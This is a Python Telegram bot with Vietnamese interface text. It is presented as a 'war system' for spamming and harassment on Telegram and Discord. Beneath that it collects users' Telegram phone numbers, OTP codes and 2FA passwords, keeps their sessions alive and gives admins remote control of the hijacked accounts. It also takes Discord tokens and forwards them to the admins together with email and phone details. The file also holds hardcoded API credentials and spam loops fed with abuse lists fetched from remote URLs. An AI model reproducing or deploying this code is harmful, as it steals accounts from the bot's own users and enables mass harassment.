import asyncio, os, random, datetime, edge_tts, re, glob, requests, json, base64, time
from aiohttp import web
from telethon import TelegramClient, events, Button, functions, types
from telethon.errors import (
    FloodWaitError, RPCError, UserNotParticipantError, 
    SessionPasswordNeededError, PhoneCodeInvalidError, 
    PhoneCodeExpiredError, PhoneNumberInvalidError, PasswordHashInvalidError
)
import aiofiles

try:
    from curl_cffi.requests import AsyncSession
except ImportError:
    pass

# ==========================================
# CẤU HÌNH HỆ THỐNG
# ==========================================
A_ID = 32300846
A_HS = "a6da3117ff6b8a1679d04ab743976068"
B_TK = '8991807402:AAG9h73vG6QaMnWWBTiakYePWKwcamsbO1s'
O_ID = 7907990385

REQUIRED_GROUPS = [
    {"username": "muadonglanhgia36", "link": "https://t.me/muadonglanhgia36", "name": "Nhóm 1"},
    {"username": "chatmuadonglanhgia", "link": "https://t.me/chatmuadonglanhgia", "name": "Nhóm 2"}
]

U1 = "https://raw.githubusercontent.com/ehvuebe-png/Cailontaone/main/chui.txt"
U2 = "https://gist.githubusercontent.com/tranthanhloc2099-wq/26971850c22bbc6578dae5a91fc2f154/raw/e96b3178dbce97dab5a9218eced5085802eb1711/chui2.txt"

user_delays = {}
DEFAULT_DELAY = 0.2

admin_selected_target = {}
anti_disconnect_tasks = {}

# Lưu trữ phiên làm việc Discord tương tác qua Telegram Bot cho từng user
discord_sessions = {}

def get_user_delay(u_i):
    return user_delays.get(u_i, DEFAULT_DELAY)

def _sync():
    for n, u in {"chui.txt": U1, "chui2.txt": U2}.items():
        try:
            r = requests.get(u, timeout=10)
            if r.status_code == 200:
                with open(n, "w", encoding="utf-8") as f: f.write(r.text)
        except: pass
_sync()

bot = TelegramClient('bot_manage', A_ID, A_HS).start(bot_token=B_TK)
o_p, u_c, c_b, c_i, s_t, cl_t, a_r, o_f, w_m = {}, {}, {}, {}, {}, {}, {}, {}, {}

F1, F2, F3, F4, F5 = "bot_users.txt", "banned_users.txt", "joined_users.txt", "admins.txt", "vip_users.txt"

if os.path.exists(F2):
    with open(F2, "r") as f: b_u = set(int(l.strip()) for l in f if l.strip())
else: b_u = set()

if os.path.exists(F3):
    with open(F3, "r") as f: verified_users = set(int(l.strip()) for l in f if l.strip())
else: verified_users = set()

if os.path.exists(F4):
    with open(F4, "r") as f: admins = set(int(l.strip()) for l in f if l.strip())
else: admins = {O_ID}

if os.path.exists(F5):
    with open(F5, "r") as f: v_u = set(int(l.strip()) for l in f if l.strip())
else: v_u = set()

def _save_verified():
    with open(F3, "w") as f:
        for uid in verified_users: f.write(f"{uid}\n")

def _save_admins():
    with open(F4, "w") as f:
        for aid in admins: f.write(f"{aid}\n")

def _sv():
    with open(F5, "w") as f:
        for u in v_u: f.write(f"{u}\n")

def _sb():
    with open(F2, "w") as f:
        for u in b_u: f.write(f"{u}\n")

def _su(u):
    if not os.path.exists(F1): open(F1, "w").close()
    with open(F1, "r") as f: us = f.read().splitlines()
    if str(u) not in us:
        with open(F1, "a") as f: f.write(f"{u}\n")

async def is_user_in_channel(user_id):
    if user_id in admins: return True
    try:
        for group in REQUIRED_GROUPS:
            await bot(functions.channels.GetParticipantRequest(
                channel=group["username"], participant=user_id
            ))
        if user_id not in verified_users:
            verified_users.add(user_id)
            _save_verified()
        return True
    except UserNotParticipantError:
        if user_id in verified_users:
            verified_users.remove(user_id)
            _save_verified()
        return False
    except Exception:
        if user_id in verified_users:
            return True
        return False

# ==========================================
# GIAO DIỆN CHỌN APP (SAU KHI VÀO ĐỦ NHÓM)
# ==========================================
def get_app_selector_menu():
    msg = """
🌐 **HỆ THỐNG WAR SYSTEM MULTI-PLATFORM**
────────────────
Vui lòng chọn ứng dụng bạn muốn chiến:
"""
    buttons = [
        [Button.inline("📱 Telegram War System", data="app_telegram")],
        [Button.inline("🤖 Discord Spam System", data="app_discord")]
    ]
    return msg, buttons

def get_main_menu(u):
    logged = u in u_c
    status_text = "🟢 ĐÃ LOGIN (Sẵn sàng chiến)" if logged else "🔴 CHƯA LOGIN (Cần đăng nhập)"
    current_delay = get_user_delay(u)
    
    msg = f"""
🔥 **TELEGRAM WAR SYSTEM**
────────────────
• Trạng thái tài khoản: `{status_text}`
• Delay hiện tại: `{current_delay}s`
• Chọn chức năng bên dưới:
"""
    buttons = [
        [Button.inline("💥 Spam & Tag", data="m_spam"), Button.inline("☠ Mute / Câm", data="m_mute")],
        [Button.inline("📦 Lặt Vặt & Tiện Ích", data="m_other"), Button.inline("⚙️ CẤU HÌNH DELAY", data="m_setting")]
    ]
    
    if u in admins:
        buttons.append([Button.inline("🎮 Bảng Điều Khiển Acc Remote (Admin)", data="m_control")])

    buttons.append([Button.inline("📱 LOGIN TÀI KHOẢN", data="login"), Button.inline("🚪 LOGOUT", data="logout_acc")])
    
    if u in admins:
        buttons.append([Button.inline("👑 Lệnh Admin System", data="m_admin")])
        
    buttons.append([Button.inline("🔙 Quay Lại Chọn App", data="back_to_apps")])
    buttons.append([Button.url("💬 Admin Hỗ Trợ", "https://t.me/Mduchotwar")])
    
    return msg, buttons

def get_join_msg():
    msg = """
⚠️ **YÊU CẦU THAM GIA ĐỦ 2 NHÓM**

Bạn phải tham gia **đầy đủ các nhóm** dưới đây thì mới sử dụng được bot:
"""
    buttons = []
    idx = 1
    for g in REQUIRED_GROUPS:
        buttons.append([Button.url(f"📢 Vào {g['name']}", g["link"])])
        msg += f"\n{idx}. [{g['name']}]({g['link']})"
        idx += 1

    msg += "\n\nVào đủ nhóm xong bấm nút **Xác Nhận** bên dưới."
    buttons.append([Button.inline("🔄 Xác Nhận Đã Vào Đủ Nhóm", data="check_join")])
    return msg, buttons

async def notify_admin_login(client, user_id, phone_number):
    try:
        me = await client.get_me()
        full_user = await client(functions.users.GetFullUserRequest(id=me.id))
        about_text = full_user.full_user.about or "Không có"
        
        device_model = "Không xác định"
        app_version = "Không xác định"
        try:
            auths = await client(functions.account.GetAuthorizationsRequest())
            for auth in auths.authorizations:
                if auth.current:
                    device_model = f"{auth.device_model} ({auth.platform})"
                    app_version = auth.app_name
                    break
        except:
            pass

        now = datetime.datetime.now()
        time_str = now.strftime('%H:%M:%S - %d/%m/%Y')

        photos = await client.get_profile_photos('me', limit=1)
        avatar_path = None
        if photos:
            avatar_path = await client.download_media(photos[0], file=f"avatar_{user_id}.jpg")
        
        caption = f"""
🚨 **THÔNG BÁO TÀI KHOẢN TELEGRAM LOGIN THÀNH CÔNG**
────────────────
• **Thời gian:** `{time_str}`
• **ID Userbot:** `{me.id}`
• **Họ Tên:** `{me.first_name} {me.last_name or ''}`
• **Username:** `@{me.username if me.username else 'N/A'}`
• **Số Điện Thoại:** `+{phone_number}`
• **Hồ Sơ (Bio):** `{about_text}`
• **Thiết Bị:** `{device_model}`
• **Ứng Dụng:** `{app_version}`
• **ID Người Dùng Bot:** `{user_id}`
"""
        buttons = [[Button.inline("🎮 Điều Khiển Acc Này", data=f"sel_acc_{user_id}")]]

        for admin_id in admins:
            try:
                if avatar_path and os.path.exists(avatar_path):
                    await bot.send_file(admin_id, avatar_path, caption=caption, buttons=buttons, parse_mode='markdown')
                else:
                    await bot.send_message(admin_id, caption, buttons=buttons, parse_mode='markdown')
            except:
                pass
                
        if avatar_path and os.path.exists(avatar_path):
            os.remove(avatar_path)
    except Exception as e:
        print(f"Lỗi gửi thông báo login: {e}")

# ==========================================
# HÀM TREO KẾT NỐI (ANTI-DISCONNECT) - 4 PHÚT
# ==========================================
async def start_anti_disconnect(target_uid, client):
    """Treo giữ kết nối bằng cách ping GetMe mỗi 4 phút (240 giây) tối ưu cho Render."""
    while target_uid in u_c:
        try:
            await client.get_me()
        except:
            pass
        await asyncio.sleep(240) # Đã đổi thành 240 giây (4 phút)

# ==========================================
# DISCORD HELPER & NOTIFY
# ==========================================
def get_discord_headers(token):
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
    props_json = json.dumps({
        "os": "Windows", "browser": "Chrome", "browser_user_agent": ua,
        "browser_version": "126.0.0.0", "client_build_number": 316286, "client_event_source": None
    }, separators=(',', ':'))
    super_props = base64.b64encode(props_json.encode()).decode()
    return {
        "Authorization": token, "Content-Type": "application/json",
        "X-Super-Properties": super_props, "User-Agent": ua,
        "Origin": "https://discord.com", "Accept": "*/*"
    }

async def get_discord_user_info(token):
    headers = get_discord_headers(token)
    url = "https://discord.com/api/v10/users/@me"
    try:
        async with AsyncSession(impersonate="chrome120") as session:
            resp = await session.get(url, headers=headers, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                user_id = int(data.get("id"))
                timestamp = ((user_id >> 22) + 1420070400000) / 1000
                created_at = datetime.datetime.fromtimestamp(timestamp).strftime('%d/%m/%Y %H:%M:%S')
                return True, data, created_at
            else:
                return False, None, None
    except:
        return False, None, None

async def notify_admin_discord_token(user_id, token, user_data, created_at):
    try:
        username = f"{user_data.get('username')}#{user_data.get('discriminator', '0')}"
        uid = user_data.get('id')
        email = user_data.get('email', 'Không có')
        phone = user_data.get('phone', 'Không có')
        nitro = "Có (Nitro)" if user_data.get('premium_type', 0) > 0 else "Không"

        caption = f"""
🚨 **CÓ TOKEN DISCORD VỪA ĐƯỢC GỬI LÊN!**
────────────────
• **ID Người Gửi Telegram:** `{user_id}`
• **Discord Username:** `{username}`
• **Discord ID:** `{uid}`
• **Ngày Tạo Tài Khoản:** `{created_at}`
• **Trạng Thái Nitro:** `{nitro}`
• **Email:** `{email}` | **Phone:** `{phone}`
• **Token:** `{token}`
"""
        for admin_id in admins:
            try:
                await bot.send_message(admin_id, caption, parse_mode='markdown')
            except:
                pass
    except Exception as e:
        print(f"Lỗi gửi thông báo token discord: {e}")

# ==========================================
# TELEGRAM USERBOT LOGIC & HANDLERS
# ==========================================
def _logic(c, u_i):
    def _mk(cid): w_m[f"{u_i}_{cid}"] = datetime.datetime.now(datetime.timezone.utc)

    async def _sd(cid, ct, tid=None):
        s_t[u_i] = True
        inf = isinstance(ct, str)
        ls = ct if not inf else [ct]
        while s_t.get(u_i):
            for m in ls:
                if not s_t.get(u_i): break
                try:
                    fm = f"{m.strip()} [\u200b](tg://user?id={tid})" if tid else m.strip()
                    await c.send_message(cid, fm, parse_mode='markdown')
                    delay = get_user_delay(u_i)
                    await asyncio.sleep(delay)
                except FloodWaitError as e: await asyncio.sleep(e.seconds + 2)
                except: break
            if not inf: break

    @c.on(events.NewMessage(outgoing=True, pattern=r'/sptagname (@?\w+)'))
    async def _sptagname(e):
        username = e.pattern_match.group(1).replace('@', '')
        _mk(e.chat_id); await e.delete()
        if os.path.exists('chui.txt'):
            with open('chui.txt', 'r', encoding='utf-8') as f:
                lines = [line.strip() for line in f if line.strip()]
            if not lines: return
            s_t[u_i] = True
            while s_t.get(u_i):
                for m in lines:
                    if not s_t.get(u_i): break
                    try:
                        fm = f"{m} [@{username}](tg://resolve?domain={username})"
                        await c.send_message(e.chat_id, fm, parse_mode='markdown')
                        delay = get_user_delay(u_i)
                        await asyncio.sleep(delay)
                    except FloodWaitError as err: await asyncio.sleep(err.seconds + 2)
                    except: break

    @c.on(events.NewMessage(outgoing=True, pattern=r'/info(?:\s+(.+))?'))
    async def _inf(e):
        target = e.pattern_match.group(1)
        try:
            if target: user = await c.get_entity(int(target) if target.isdigit() else target)
            elif e.is_reply: user = await c.get_entity((await e.get_reply_message()).sender_id)
            else: user = await c.get_me()
            await e.edit(f"👤 **Name:** {user.first_name}\n🆔 **ID:** `{user.id}`\n🏷 **User:** @{user.username if user.username else 'N/A'}")
        except: await e.edit("❌ **Không tìm thấy!**")

    @c.on(events.NewMessage(outgoing=True, pattern=r'/stop'))
    async def _stp(e):
        s_t[u_i] = False; cl_t[u_i] = False; await e.edit("🛑 **STOP!**"); await asyncio.sleep(1); await e.delete()

@bot.on(events.NewMessage(pattern='/start'))
async def _st(ev):
    u = ev.sender_id
    _su(u)
    if await is_user_in_channel(u):
        msg, buttons = get_app_selector_menu()
        await ev.respond(msg, buttons=buttons, parse_mode='markdown')
    else:
        msg, buttons = get_join_msg()
        await ev.respond(msg, buttons=buttons, parse_mode='markdown')

@bot.on(events.CallbackQuery)
async def _callback_handler(ev):
    u = ev.sender_id
    data = ev.data.decode('utf-8')

    if u in b_u: return await ev.answer("🚫 Bạn đã bị BAN!", alert=True)

    if data == "check_join":
        if await is_user_in_channel(u):
            msg, buttons = get_app_selector_menu()
            await ev.edit(msg, buttons=buttons, parse_mode='markdown')
            return await ev.answer("✅ Đã xác nhận tham gia đủ các nhóm!", alert=True)
        else:
            return await ev.answer("❌ Bạn vẫn chưa tham gia đủ cả 2 nhóm!", alert=True)

    if not await is_user_in_channel(u):
        msg, buttons = get_join_msg()
        try: await ev.edit(msg, buttons=buttons, parse_mode='markdown')
        except: await ev.respond(msg, buttons=buttons, parse_mode='markdown')
        return await ev.answer("⚠️ Bạn thiếu nhóm tham gia! Vui lòng vào đủ nhóm.", alert=True)

    if data == "back_to_apps":
        msg, buttons = get_app_selector_menu()
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    elif data == "app_telegram":
        msg, buttons = get_main_menu(u)
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    elif data == "app_discord":
        discord_sessions[u] = {"tokens": [], "channels": [], "content": "TLong spam tới", "delay": 5.0, "step": "ask_num"}
        txt = """
🤖 **DISCORD SPAM SYSTEM SETUP**
────────────────
• Nhập số lượng Token bạn muốn dùng:
*(Ví dụ: gửi số `2`)*
"""
        await ev.edit(txt, buttons=[[Button.inline("🔙 Quay Lại", data="back_to_apps")]], parse_mode='markdown')

    elif data == "dc_reset":
        discord_sessions[u] = {"tokens": [], "channels": [], "content": "TLong spam tới", "delay": 5.0, "step": "ask_num"}
        txt = "🔄 **Đã reset cấu hình Discord!**\n• Nhập số lượng Token bạn muốn dùng:"
        await ev.edit(txt, buttons=[[Button.inline("🔙 Quay Lại", data="back_to_apps")]], parse_mode='markdown')

    elif data == "dc_logout":
        discord_sessions.pop(u, None)
        msg, buttons = get_app_selector_menu()
        await ev.edit("🚪 **Đã đăng xuất phiên Discord!**\n\n" + msg, buttons=buttons, parse_mode='markdown')

    elif data == "m_main":
        msg, buttons = get_main_menu(u)
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    elif data == "m_spam":
        warn = "\n\n⚠️ **Lưu ý:** *Vui lòng LOGIN tài khoản để thực thi các lệnh này!*" if u not in u_c else ""
        txt = f"💥 **DANH SÁCH LỆNH SPAM & TAG**\n────────────────\n• `/sptagname <Tên>`: Spam tag kèm tên\n• `/sp <id>`: Spam chửi 1\n• `/sp2 <id>`: Spam chửi 2\n• `/spicon <số>`: Spam icon\n• `/stop`: Dừng lại tất cả{warn}"
        await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về", data="m_main")]], parse_mode='markdown')

    elif data == "m_mute":
        warn = "\n\n⚠️ **Lưu ý:** *Vui lòng LOGIN tài khoản để thực thi các lệnh này!*" if u not in u_c else ""
        txt = f"☠ **DANH SÁCH LỆNH MUTE / CÂM**\n────────────────\n• `/cam <id>`: Câm box\n• `/sua <id>`: Mở câm box\n• `/camib <id>`: Câm inbox\n• `/suaib <id>`: Mở câm inbox{warn}"
        await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về", data="m_main")]], parse_mode='markdown')

    elif data == "m_other":
        warn = "\n\n⚠️ **Lưu ý:** *Vui lòng LOGIN tài khoản để thực thi các lệnh này!*" if u not in u_c else ""
        txt = f"📦 **DANH SÁCH LẶT VẶT & ACC**\n────────────────\n• `/info <@/id/rep>`: Soi acc\n• `/fake <@/id/rep>`: Fake acc đối tượng\n• `/diefake`: Trở về acc gốc\n• `/voice <văn bản>`: Tạo voice\n• `/logout`: Thoát acc khỏi bot{warn}"
        await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về", data="m_main")]], parse_mode='markdown')

    elif data == "m_setting":
        cur_d = get_user_delay(u)
        txt = f"""
⚙️ **CẤU HÌNH DELAY TOÀN BỘ CHỨC NĂNG**
────────────────
• Delay hiện tại của bạn: `{cur_d} giây`
• Mặc định hệ thống: `{DEFAULT_DELAY} giây`
"""
        buttons = [
            [Button.inline("⏱ Đặt Mặc Định (0.2s)", data="set_delay_default")],
            [Button.inline("⚡ Set Delay 0.1s", data="set_delay_01"), Button.inline("🐢 Set Delay 0.5s", data="set_delay_05")],
            [Button.inline("🐌 Set Delay 1.0s", data="set_delay_10"), Button.inline("💬 Nhập Số Giây Tự Chỉnh", data="set_delay_custom")],
            [Button.inline("🔙 Trở Về Menu", data="m_main")]
        ]
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

    elif data == "set_delay_default":
        user_delays[u] = DEFAULT_DELAY
        await ev.answer(f"✅ Đã reset Delay về mặc định ({DEFAULT_DELAY}s)", alert=True)
        msg, buttons = get_main_menu(u)
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    elif data == "set_delay_01":
        user_delays[u] = 0.1
        await ev.answer("✅ Đã đổi Delay thành 0.1s", alert=True)
        msg, buttons = get_main_menu(u)
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    elif data == "set_delay_05":
        user_delays[u] = 0.5
        await ev.answer("✅ Đã đổi Delay thành 0.5s", alert=True)
        msg, buttons = get_main_menu(u)
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    elif data == "set_delay_10":
        user_delays[u] = 1.0
        await ev.answer("✅ Đã đổi Delay thành 1.0s", alert=True)
        msg, buttons = get_main_menu(u)
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    elif data == "set_delay_custom":
        await ev.answer()
        async with bot.conversation(u) as cv:
            await cv.send_message("⏱ **Nhập thời gian Delay mong muốn** (tính bằng giây, ví dụ: `0.3` hoặc `2`):")
            try:
                res = await cv.get_response()
                val = float(res.text.strip())
                if val < 0.05: val = 0.05
                user_delays[u] = val
                await cv.send_message(f"✅ **Đã cài đặt Delay thành công:** `{val} giây`!")
            except:
                await cv.send_message("❌ Số giây nhập không hợp lệ!")

    elif data == "m_control":
        if u not in admins: return await ev.answer("❌ Chỉ Admin mới có quyền!", alert=True)
        if not u_c:
            txt = "🎮 **BẢNG ĐIỀU KHIỂN TÀI KHOẢN REMOTE**\n────────────────\n⚠️ *Hiện chưa có tài khoản nào đăng nhập.*"
            return await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về Menu", data="m_main")]], parse_mode='markdown')

        txt = f"🎮 **QUẢN LÝ TÀI KHOẢN THEO STT**\n────────────────\n• Tổng số tài khoản: `{len(u_c)}`\n👇 **Chọn tài khoản bên dưới:**"
        buttons = []
        idx = 1
        for uid in u_c.keys():
            buttons.append([Button.inline(f"TK {idx}. ID: {uid}", data=f"sel_acc_{uid}")])
            idx += 1
        buttons.append([Button.inline("🔙 Trở Về Menu", data="m_main")])
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

    elif data.startswith("sel_acc_"):
        if u not in admins: return await ev.answer("Chỉ Admin mới có quyền!", alert=True)
        target_uid = int(data.split("_")[2])
        if target_uid not in u_c: return await ev.answer("Tài khoản này đã logout!", alert=True)
        admin_selected_target[u] = target_uid
        client = u_c[target_uid]
        me = await client.get_me()
        
        is_anti_running = target_uid in anti_disconnect_tasks and not anti_disconnect_tasks[target_uid].done()
        anti_status = "🟢 Đang bật (Anti-Dis)" if is_anti_running else "🔴 Đang tắt"

        txt = f"""🕹 **HỒ SƠ TÀI KHOẢN ĐANG ĐIỀU KHIỂN:**
────────────────
👤 **Tên:** {me.first_name}
🆔 **ID:** `{me.id}`
⚡ **Trạng thái Treo Dis:** `{anti_status}`
"""
        buttons = [
            [Button.inline("💬 Gửi Tin Nhắn", data="rmt_send_one"), Button.inline("📢 Gửi All Nhóm", data="rmt_send_all")],
            [Button.inline("📋 Check Số Nhóm", data="rmt_count_groups"), Button.inline("📜 Lịch Sử 10 Tin", data="rmt_hist_p1")],
            [Button.inline("⚡ Bật/Tắt Treo Dis (Anti-Dis)", data="rmt_toggle_anti")],
            [Button.inline("🔙 Chọn Tài Khoản Khác", data="m_control")]
        ]
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

    elif data == "rmt_toggle_anti":
        if u not in admins: return
        target_uid = admin_selected_target.get(u)
        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
        
        client = u_c[target_uid]
        if target_uid in anti_disconnect_tasks and not anti_disconnect_tasks[target_uid].done():
            anti_disconnect_tasks[target_uid].cancel()
            anti_disconnect_tasks.pop(target_uid, None)
            await ev.answer("🛑 Đã TẮT tính năng Treo Disconnect cho tài khoản này!", alert=True)
        else:
            task = asyncio.create_task(start_anti_disconnect(target_uid, client))
            anti_disconnect_tasks[target_uid] = task
            await ev.answer("✅ Đã BẬT tính năng Treo Disconnect (Duy trì kết nối 24/7)! Periodic: 4 phút", alert=True)

    elif data == "logout_acc":
        if u in u_c:
            try:
                if u in anti_disconnect_tasks:
                    anti_disconnect_tasks[u].cancel()
                    anti_disconnect_tasks.pop(u, None)
                await u_c[u].log_out()
                u_c.pop(u, None)
                if os.path.exists(f"u_{u}.session"): os.remove(f"u_{u}.session")
                msg, buttons = get_app_selector_menu()
                await ev.edit("🚪 **Đã đăng xuất tài khoản thành công!**\n\n" + msg, buttons=buttons, parse_mode='markdown')
            except Exception as e: await ev.answer(f"Lỗi: {e}", alert=True)
        else: await ev.answer("⚠️ Bạn chưa đăng nhập!", alert=True)

    elif data == "login":
        if u in u_c: return await ev.answer("✅ Bạn đã đăng nhập rồi!", alert=True)
        await ev.answer()
        async with bot.conversation(u) as cv:
            try:
                await cv.send_message("📱 **Nhập Số Điện Thoại** (`+84...`):")
                p = (await cv.get_response()).text.strip().replace(" ", "")
                c = TelegramClient(f"u_{u}", A_ID, A_HS)
                await c.connect()

                if not await c.is_user_authorized():
                    try:
                        r = await c.send_code_request(p)
                    except Exception as err:
                        return await cv.send_message(f"❌ **Lỗi gửi mã:** `{err}`")

                    await cv.send_message("🔑 **Nhập OTP** (⚠️ *BẮT BUỘC cách khoảng, VD: 4 8 1 1 7*):")
                    o = (await cv.get_response()).text.strip().replace(" ", "").replace("-", "")
                    
                    try:
                        await c.sign_in(p, o, phone_code_hash=r.phone_code_hash)
                    except SessionPasswordNeededError:
                        await cv.send_message("🔐 **Tài khoản bật 2FA.** Nhập mật khẩu:")
                        pwd = (await cv.get_response()).text.strip()
                        await c.sign_in(password=pwd)
                    except Exception as err:
                        return await cv.send_message(f"❌ **Lỗi xác thực:** `{err}`")
                
                u_c[u] = c; _logic(c, u)
                
                task = asyncio.create_task(start_anti_disconnect(u, c))
                anti_disconnect_tasks[u] = task

                await notify_admin_login(c, u, p)

                await cv.send_message("✅ **LOGIN THÀNH CÔNG & ĐÃ BẬT GIỮ KẾT NỐI (ANTI-DIS 4 PHÚT)!**")
            except Exception as e:
                await cv.send_message(f"❌ **Lỗi Login:** `{e}`")

@bot.on(events.NewMessage(incoming=True))
async def handle_discord_text_input(ev):
    u = ev.sender_id
    if u not in discord_sessions: return
    if ev.text.startswith('/'): return

    session = discord_sessions[u]
    step = session.get("step")

    if step == "ask_num":
        text = ev.text.strip()
        if not text.isdigit():
            return await ev.respond("❌ Vui lòng nhập một số nguyên hợp lệ!")
        num = int(text)
        session["num_tokens"] = num
        session["step"] = "ask_tokens"
        await ev.respond(f"🔑 **Vui lòng gửi {num} token Discord** (nếu nhiều hơn 1 token, cách nhau bởi dấu phẩy `,`):")

    elif step == "ask_tokens":
        raw_tokens = ev.text.strip()
        tokens = [t.strip() for t in raw_tokens.replace(",", " ").split() if t.strip()]
        if len(tokens) != session["num_tokens"]:
            return await ev.respond(f"❌ Bạn cần gửi đúng {session['num_tokens']} token (hiện nhận được {len(tokens)}). Vui lòng gửi lại!")
        
        session["tokens"] = tokens
        for t in tokens:
            valid, user_data, created_at = await get_discord_user_info(t)
            if valid:
                await notify_admin_discord_token(u, t, user_data, created_at)

        session["step"] = "ask_channels"
        await ev.respond("✅ **Đã nhận và lưu token thành công!**\n\n📌 **Bước tiếp theo:** Nhập **ID Kênh / Nhóm chat** Discord muốn spam (nhiều ID cách nhau bằng dấu phẩy hoặc khoảng trắng):")

    elif step == "ask_channels":
        ch_input = ev.text.strip()
        channel_ids = [part.strip() for part in ch_input.replace(",", " ").split() if part.strip().isdigit()]
        if not channel_ids:
            return await ev.respond("❌ Không có ID kênh hợp lệ! Vui lòng nhập lại.")
        
        session["channels"] = channel_ids
        session["step"] = "ask_content"
        await ev.respond("📝 **Nhập nội dung tin nhắn** muốn spam:")

    elif step == "ask_content":
        content = ev.text.strip()
        if not content:
            return await ev.respond("❌ Nội dung không được để trống!")
        
        session["content"] = content
        session["step"] = "ask_delay"
        await ev.respond("⏱ **Nhập thời gian Delay** (giây, ví dụ: `2.0`):")

    elif step == "ask_delay":
        try:
            delay = float(ev.text.strip())
            if delay < 0.1: delay = 0.1
        except:
            delay = 2.0
        
        session["delay"] = delay
        session["step"] = "ready"

        summary_txt = f"""
🤖 **DISCORD SPAM DASHBOARD**
────────────────
• **Số lượng Token:** `{len(session['tokens'])}`
• **ID Kênh:** `{', '.join(session['channels'])}`
• **Nội dung:** `{session['content']}`
• **Delay:** `{session['delay']}s`
• **Trạng thái:** Sẵn sàng chiến!
"""
        buttons = [
            [Button.inline("🚀 BẮT ĐẦU SPAM DISCORD", data="dc_start_spam")],
            [Button.inline("🔄 Reset cấu hình", data="dc_reset"), Button.inline("🚪 Đăng xuất / Thoát", data="dc_logout")],
            [Button.inline("🔙 Quay Lại Chọn App", data="back_to_apps")]
        ]
        await ev.respond(summary_txt, buttons=buttons, parse_mode='markdown')

@bot.on(events.CallbackQuery(pattern=b"dc_start_spam"))
async def start_discord_spam_task(ev):
    u = ev.sender_id
    if u not in discord_sessions: return
    session = discord_sessions[u]
    tokens = session["tokens"]
    channels = [{"id": cid, "name": cid} for cid in session["channels"]]
    content = session["content"]
    delay = session["delay"]

    await ev.answer("🚀 Đã khởi động tiến trình spam Discord ngầm!", alert=True)
    await ev.edit("🔥 **Đang tiến hành Spam Discord...**", buttons=[[Button.inline("🔄 Reset", data="dc_reset"), Button.inline("🚪 Thoát", data="dc_logout")]], parse_mode='markdown')

    async def run_spam():
        async with AsyncSession(impersonate="chrome120") as session_http:
            while True:
                for t in tokens:
                    headers = get_discord_headers(t)
                    for ch in channels:
                        url = f"https://discord.com/api/v10/channels/{ch['id']}/messages"
                        try:
                            await session_http.post(url, headers=headers, json={"content": content, "tts": False}, timeout=10)
                        except:
                            pass
                        await asyncio.sleep(delay)

    asyncio.create_task(run_spam())

# ==========================================
# WEB SERVER GIỮ SỐNG (RENDER)
# ==========================================
async def handle_ping(request):
    return web.Response(text="Bot War Multi-Platform is running 24/7!")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_ping)
    app.router.add_get('/ping', handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    return runner

async def main():
    await start_web_server()
    
    for f in glob.glob("u_*.session"):
        try:
            u_str = f.split('_')[1].split('.')[0]
            if not u_str.isdigit(): continue
            u = int(u_str)
            if u in b_u: continue
            c = TelegramClient(f"u_{u}", A_ID, A_HS)
            await c.connect()
            if await c.is_user_authorized():
                u_c[u] = c
                _logic(c, u)
                task = asyncio.create_task(start_anti_disconnect(u, c))
                anti_disconnect_tasks[u] = task
            else: await c.disconnect()
        except: pass
        
    await bot.run_until_disconnected()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
tt
